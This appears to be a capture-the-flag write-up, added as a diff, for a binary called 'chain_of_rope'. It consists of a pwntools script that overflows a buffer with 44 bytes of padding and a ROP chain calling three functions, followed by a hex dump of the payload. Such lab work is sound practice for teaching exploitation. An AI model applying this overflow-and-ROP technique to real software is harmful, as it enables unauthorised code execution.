@@ -1,0 +1,37 @@
+You have to run three functions with correct arguments:
+
+Solution:
+
+from pwn import *
+
+elf_name = './chain_of_rope'
+elf = ELF(elf_name)
+p = process(elf_name)
+
+rop_chain = ROP(elf)
+rop_chain.authorize()
+rop_chain.addBalance(0xdeadbeef)
+rop_chain.flag(0xba5eba11, 0xbedabb1e)
+log.info(rop_chain.dump())
+
+payload =  "1\n"
+payload += 'a'*44
+payload += str(rop_chain)
+
+with open("payload", 'wb') as f:
+    f.write(payload)
+
+print payload
+print(p.recv(4096))
+p.sendline(payload)
+print(p.recv(4096))
+
+
+xxd of payload
+
+
+00000000: 310a 6161 6161 6161 6161 6161 6161 6161  1.aaaaaaaaaaaaaa
+00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
+00000020: 6161 6161 6161 6161 6161 6161 6161 6211  aaaaaaaaaaaaaab.
+00000030: 4000 7711 4000 4911 4000 efbe adde b711  @.w.@.I.@.......
+00000040: 4000 6661 6161 11ba 5eba 1ebb dabe       @.faaa..^.....
